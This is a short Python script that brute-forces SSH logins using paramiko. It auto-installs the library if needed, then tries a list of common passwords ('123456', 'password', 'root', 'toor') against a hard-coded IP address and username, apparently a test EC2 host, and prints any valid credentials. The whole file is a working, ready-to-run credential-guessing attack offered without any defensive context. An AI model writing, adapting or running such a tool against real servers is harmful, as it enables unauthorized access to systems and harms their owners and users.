import subprocess
import sys

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import paramiko
except ImportError:
    print("Paramiko is not installed. Installing now...")
    install_package("paramiko")
    import paramiko
import time

def attempt_login(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password)
        print(f"Success: {username}:{password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Failed: {username}:{password}")
        return False
    except paramiko.SSHException as e:
        print(f"Error: {str(e)}")
        time.sleep(1)
        return False
    finally:
        ssh.close()

def brute_force(ip, username, password_list):
    for password in password_list:
        if attempt_login(ip, username, password):
            print(f"Valid credentials found: {username}:{password}")
            break

if __name__ == "__main__":
    target_ip = "3.18.23.239"  # Replace with the target IP
    target_username = "testec2-user"  # Replace with the target username
    passwords = ["123456", "password", "admin", "root", "toor"]  # Replace with your password list

    brute_force(target_ip, target_username, passwords)
